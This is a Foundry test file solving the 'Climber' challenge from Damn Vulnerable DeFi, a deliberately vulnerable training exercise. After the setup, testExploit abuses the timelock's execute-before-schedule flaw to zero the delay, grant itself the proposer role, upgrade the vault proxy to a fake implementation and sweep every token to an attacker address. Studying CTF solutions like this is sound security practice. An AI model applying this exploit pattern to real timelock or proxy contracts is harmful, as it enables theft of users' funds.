// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import "src/Climber/ClimberVault.sol";
import "src/Climber/ClimberTimelock.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";

// import Attack Contracts
import "src/Climber/AttackContracts/ClimberAttack.sol";
import "src/Climber/AttackContracts/FakeVault.sol";

// Challenge #12 - Climber
// https://www.damnvulnerabledefi.xyz/challenges/climber/

contract Attack is Test {
    DamnValuableToken public token;
    ClimberVault public climberImplementation;
    ClimberTimelock public climberTimelock;
    ERC1967Proxy public climberVaultProxy;

    address public proposer = payable(address(uint160(uint256(keccak256(abi.encodePacked("proposer"))))));
    address public sweeper = payable(address(uint160(uint256(keccak256(abi.encodePacked("sweeper"))))));
    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant VAULT_TOKEN_BALANCE = 10000000 * 1e18;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 1e17;
    uint256 public constant TIMELOCK_DELAY = 60 * 60;

    function setUp() public {
        vm.deal(hacker, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(hacker.balance, PLAYER_INITIAL_ETH_BALANCE);

        climberImplementation = new ClimberVault();

        bytes memory data =
            abi.encodeWithSignature("initialize(address,address,address)", address(this), proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), address(sweeper));
        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);
        assertFalse(ClimberVault(address(climberVaultProxy)).owner() == address(0));
        assertFalse(ClimberVault(address(climberVaultProxy)).owner() == address(this));

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertEq(climberTimelock.delay(), TIMELOCK_DELAY);

        bytes4 errorCallerNotTimelock = bytes4(keccak256(bytes("CallerNotTimelock()")));
        vm.expectRevert(abi.encodeWithSelector(errorCallerNotTimelock));
        climberTimelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        assertTrue(climberTimelock.hasRole(keccak256("PROPOSER_ROLE"), proposer));
        assertTrue(climberTimelock.hasRole(keccak256("ADMIN_ROLE"), address(this)));
        assertTrue(climberTimelock.hasRole(keccak256("ADMIN_ROLE"), address(climberTimelock)));

        token = new DamnValuableToken();
        token.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);
    }

    function testExploit() public {
        // Attack Code:
        uint256[] memory values = new uint256[](3);
        for (uint256 i = 0; i < 3; i++) {
            values[i] = 0;
        }
        bytes32 salt = bytes32("climber");
        ClimberAttack climberAttack = new ClimberAttack(payable(address(climberTimelock)),values,salt);

        FakeVault fakeVault = new FakeVault(hacker);

        bytes[] memory dataElements = new bytes[](3);
        bytes memory data1 = abi.encodeWithSignature("updateDelay(uint64)", 0);
        bytes memory data2 = abi.encodeWithSignature(
            "grantRole(bytes32,address)", bytes32(keccak256("PROPOSER_ROLE")), address(climberAttack)
        );
        bytes memory data3 = abi.encodeWithSignature("hackSchedule()");
        dataElements[0] = data1;
        dataElements[1] = data2;
        dataElements[2] = data3;
        climberAttack.addData(dataElements);

        address[] memory targets = new address[](3);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberAttack);
        climberTimelock.execute(targets, values, dataElements, salt);
        climberAttack.checkRole();

        console.log("climberAttack Contract get proposer role: ", climberAttack.hasRole());

        address[] memory target = new address[](1);
        target[0] = address(climberVaultProxy);
        uint256[] memory value = new uint256[](1);
        value[0] = 0;
        bytes[] memory dataElement = new bytes[](1);
        dataElement[0] = abi.encodeWithSignature("upgradeTo(address)", address(fakeVault));

        climberAttack.schedule(target, value, dataElement, salt);
        climberTimelock.execute(target, value, dataElement, salt);
        vm.startPrank(hacker);
        ClimberVault(address(climberVaultProxy)).sweepFunds(address(token));
        vm.stopPrank();

        // ------ TEst ------

        assertEq(token.balanceOf(hacker), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(climberVaultProxy)), 0);
    }
}
